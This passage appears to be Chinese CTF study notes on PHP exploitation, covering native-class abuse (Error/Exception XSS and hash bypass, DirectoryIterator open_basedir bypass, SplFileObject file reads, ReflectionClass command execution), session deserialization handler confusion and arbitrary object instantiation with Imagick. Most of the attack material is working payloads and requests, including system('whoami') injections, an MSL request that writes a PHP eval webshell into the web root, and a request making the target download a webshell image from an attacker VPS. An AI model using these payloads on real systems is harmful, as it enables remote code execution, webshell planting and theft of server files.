//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

[https://blog.csdn.net/RABCDXB/article/details/116463163](https://blog.csdn.net/RABCDXB/article/details/116463163)

考点：利用exception类进行xss

#### 绕过哈希比较

在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。

##### Error类

**Error** 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。

```php
Error implements Throwable {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数

**类方法：**

- [Error::__construct](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
- [Error::getMessage](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
- [Error::getPrevious](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
- [Error::getCode](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
- [Error::getFile](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
- [Error::getLine](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
- [Error::getTrace](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
- [Error::getTraceAsString](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
- [Error::__toString](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
- [Error::__clone](https://www.php.net/manual/zh/error.clone.php) — 克隆 error

##### Exception类

##### **Exception** 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。 **类摘要：**

```php
Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号

**类方法：**

- [Exception::__construct](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
- [Exception::getMessage](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
- [Exception::getPrevious](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
- [Exception::getCode](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
- [Exception::getFile](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
- [Exception::getLine](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
- [Exception::getTrace](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
- [Exception::getTraceAsString](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
- [Exception::__toString](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
- [Exception::__clone](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆

我们可以看到，在Error和Exception这两个PHP原生类中内只有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。

我们以Error为例，我们看看当触发他的 __toString 方法时会发生什么：

```php
<?php
$a = new Error("payload",1);
echo $a;
```

输出如下：

```php
Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}
```

可见，$a 和 $b 这两个错误对象本身是不同的，但是 **toString 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 **toString 返回的数据包含当前行号。

Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。
Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。

[https://blog.csdn.net/fmyyy1/article/details/117162062](https://blog.csdn.net/fmyyy1/article/details/117162062)

```php
<?php
$a = new Error("payload",1);$b = new Error("payload",2); //要在一行
echo $a;
echo "<br>";
echo $b;
echo "<br>";
if($a != $b)
{
    echo "a!=b";
}
echo "<br>";
if(md5($a) === md5($b))
{
    echo "md5相等"."<br>";
}
if(sha1($a)=== sha1($b)){
    echo "sha1相等";
}
```

### 使用 DirectoryIterator 类绕过 open_basedir

`DirectoryIterator` 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。

`DirectoryIterator与glob://`协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。

测试代码：

```php
// test.php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

//payload一句话的形式:
//$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

我们输入`/?whoami=glob:///*` 即可列出根目录下的文件：
![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187034151-30164a28-226e-4d22-9699-e5b1543982bb.png#id=KZxvd&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 使用 SimpleXMLElement 类进行 XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

#### SimpleXMLElement

官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187156012-aa0cd457-c925-4ed9-a0c1-d86bf4cf2bc4.png#id=w3dcr&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187173653-ce37291c-aa48-4341-a9fb-a05187dde76c.png#id=aofQF&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。

这样的话，当我们可以控制目标调用的类的时候，便可以通过 `SimpleXMLElement` 这个内置类来构造 `XXE`。

[https://blog.csdn.net/a3320315/article/details/104288865](https://blog.csdn.net/a3320315/article/details/104288865)

### FilesystemIterator

[https://blog.csdn.net/chenrenchou1924/article/details/100999849](https://blog.csdn.net/chenrenchou1924/article/details/100999849)

### GlobIterator

GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容

```php
?a=GlobIterator&b=f[a-z]*
```

### SplFileObject

SplFileObject类为文件提供了一个面向对象接口，也就是这个类可以用来读文件

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
```

我们传入?a=SplFileObject&b=flag.php，即可读取我们flag.php里面的内容，但是他只能读一行！！！

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187563227-6b06a00a-8e0d-4a62-bb6f-45e4521cffb6.png#id=h4hbZ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload

```php
?a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php
```

### 反射类

#### ReflectionClass

ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作

反射类不仅仅可以建立对类的映射，也可以**建立对PHP基本方法的映射**，并且返回基本方法执行的情况。因此可以通过建立反射类`new ReflectionClass(system('cmd'))`来执行命令

这里我们直接使用CTFshow的web109来作为例题

```php
<?php 

/* 
# -*- coding: utf-8 -*- 
# @Author: h1xa 
# @Date:   2020-09-16 11:25:09 
# @Last Modified by:   h1xa 
# @Last Modified time: 2020-09-29 22:02:34 

*/ 


highlight_file(__FILE__); 
error_reporting(0); 
if(isset($_GET['v1']) && isset($_GET['v2'])){ 
    $v1 = $_GET['v1']; 
    $v2 = $_GET['v2']; 

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){ 
            eval("echo new $v1($v2());"); 
    } 

} 
?>
```

已知了flag在`./fl36dg.txt`，命令执行`system(‘cat fl36dg.txt’)`获取flag，所以应该传入如下参数

```php
v1=ReflectionClass&v2=system("ls")
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187919531-d4d02a6d-a8be-49ae-b2d0-b4b283ece7f6.png#id=SnAlj&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

#### ReflectionMethod

和ReflectionClass一样，直接上图

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680187954522-a716203e-95bb-442d-a5d8-ffbb69756c52.png#id=IF251&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

`Typecho_Db_Exception`类在`/var/Typecho/Db/Query.php`中，这里有一个`//__toString()`的注释，直接看__toString函数里的内容

稍微复杂一点的可以看这道题，国赛2021 `easysource`就是抄这道题的

[https://r0yanx.com/2020/10/28/fslh-writeup/](https://r0yanx.com/2020/10/28/fslh-writeup/)

### Imagick

```php
<?php
$a=$_GET['a'];
$b=$_GET['b'];
new $a($b);
```

可以用下面的手法来打。paylaod的意思是玩positive.php，写入马。

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20231107163405408.png#id=mjG0c&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```http
Class Name: Imagick
Argument Value: vid:msl:/tmp/php*

-- Request Data --
Content-Type: multipart/form-data; boundary=ABC
Content-Length: ...
Connection: close
 
--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain
 
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
 <!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
 <write filename="info:/var/www/swarm.php" />
</image>
--ABC--
```

## session反序化漏洞

### session 的存储机制

php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的

| **php_serialize** | **经过serialize()函数序列化数组** |
| --- | --- |
| php | 键名+竖线+经过serialize()函数处理的值 |
| php_binary | 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 |


php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题。

### $_SESSION变量直接可控

来看看这两个php

```python
// 1.php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['y4'] = $_GET['a'];
var_dump($_SESSION);
//2.php
<?php
ini_set('session.serialize_handler', 'php');
session_start();
class test{
    public $name;
    function __wakeup(){
        echo $this->name;
    }
}
```

首先访问1.php，传入参数`a=|O:4:"test":1:{s:4:"name";s:8:"y4tacker";}`再访问2.php，注意不要忘记|

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680878919252-a7f2bdc2-51de-4134-8973-04a7bca79f05.png#id=f0Jiz&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

由于1.php是使用php_serialize引擎处理，因此只会把'|'当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到'|'时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。

### $_SESSION变量直接不可控

我们来看高校战疫的一道CTF题目

```php
<?php
  //A webshell is wait for you
  ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
  public $mdzz;
  function __construct()
  {
    $this->mdzz = 'phpinfo();';
  }

  function __destruct()
  {
    eval($this->mdzz);
  }
}
if(isset($_GET['phpinfo']))
{
  $m = new OowoO();
}
else
{
  highlight_string(file_get_contents('index.php'));
}
?>
```

我们注意到这样一句话`ini_set('session.serialize_handler', 'php');`，因此不难猜测本身在`php.ini`当中的设置可能是`php_serialize`，在查看了phpinfo后得证猜测正确，也知道了这道题的考点

那么我们就进入phpinfo查看一下，enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中

利用：

构造文件上传的表单

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="777" />
  <input type="file" name="file" />
  <input type="submit" />
</form>
```

接下来构造序列化payload

```php
<?php
  ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
  public $mdzz='print_r(scandir(dirname(__FILE__)));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

由于采用Burp发包，为防止双引号被转义，在双引号前加上\，除此之外还要加上|

在这个页面随便上传一个文件，然后抓包修改filename的值

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680879445469-5bf20c23-aff4-4239-aca8-8387dc067fa1.png#id=Prt00&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到`Here_1s_7he_fl4g_buT_You_Cannot_see.php`这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680879634043-9dc9a1e0-806b-45e5-b5f1-adf575f10b2d.png#id=DPv5M&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

因此我们只需要把payload，当中改为`print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));`即可获取flag

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class OowoO
{
    public $mdzz='print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
}
$obj = new OowoO();
echo serialize($obj);
?>
```

# new $a($b)

## eval("echo new $a($b);")

```python
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
eval("echo new $a($b);");
```

给a随便传⼀个原⽣类，给b传恶意命令即可：

```python
?a=Exception&b=system('whoami')
?a=SplFileObject&b=system('whoami')
```

## echo new $a($b)

```python
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
```

针对这样的代码，读flag的操作步骤如下：

⾸先⽤能遍历⽬录的原⽣类，⽐如DirectoryIterator结合glob读⽂件名

```python
?a=DirectoryIterator&b=glob://f*
```

用伪协议度文件

```python
?a=SplFileObject&b=php://filter/convert.base64-encode/resource=f1ag.php
```

## new $a($b)

```python
<?php
error_reporting(0);
show_source(__FILE__);
new $_GET['b']($_GET['c']);
?>
```

[https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

```python
?b=Imagick&c=http://121.40.253.177:7777
```

按照⽂中的POC，在VPS中⽣成⼀个图⽚，含有⼀句话⽊⻢

```python
convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680871477259-a1fe9772-961d-4a33-b18a-70b6fafee95f.png#id=V0R6n&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在VPS中监听12345端⼝，再往服务器发送请求包如下：

```python
POST /?b=Imagick&c=vid:msl:/tmp/php* HTTP/1.1
Host: 1.1.1.1:32127
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/53
7.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmq
Tayg6bqr
Content-Length: 348
------WebKitFormBoundaryeTvfNEmqTayg6bqr
Content-Disposition: form-data; name="123"; filename="exec.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://vps:12345/positive.png" />
<write filename="/var/www/html/positive.php"/>
</image>
------WebKitFormBoundaryeTvfNEmqTayg6bqr--
```

发送后，靶机就往VPS中请求了该⽂件，并且把该⽂件下载到了指定⽬录

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680871517628-a1abe305-a2a4-4f54-bb73-8912f54750ab.png#id=n99FV&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

访问后即可RCE

以上没有讲解原理，不过还是分析⼀下这种⼿法的限制：

\1. 需要通⽹，当然如果不通⽹这种⼿法也存在⼀个重命名⽂件的功能，如果⽹站有上传功能可以利⽤

这个⼿法将恶意的JPG重命名成PHP

\2. 需要知道⽹站的⽬录（⽐赛中通常是/var/www/html或者/app这类）

\3. 需要在⽹站⽬录下有写权限，当然如果知道类似于upload这种⽂件夹的路径也可以（因为通常它们

是可写的

\4. 最最重要的：需要有装Imagick扩展，该扩展其实不是默认⾃带的（⼀定程度上限制了攻击⾯），不 过和出题⼈@M0th短暂的交流了⼀下，出题⼈表示：实际⽹站应⽤也挺多。攻击⾯这个维度还有待 考证

# 一些比较奇怪的题

## 2022DASCTF Apr  warmup-php

[https://blog.csdn.net/cosmoslin/article/details/124538896](https://blog.csdn.net/cosmoslin/article/details/124538896)

考点：调用链

# 参考：

[https://blog.csdn.net/solitudi/article/details/113588692](https://blog.csdn.net/solitudi/article/details/113588692)

[https://xz.aliyun.com/t/9293#toc-1](https://xz.aliyun.com/t/9293#toc-1)
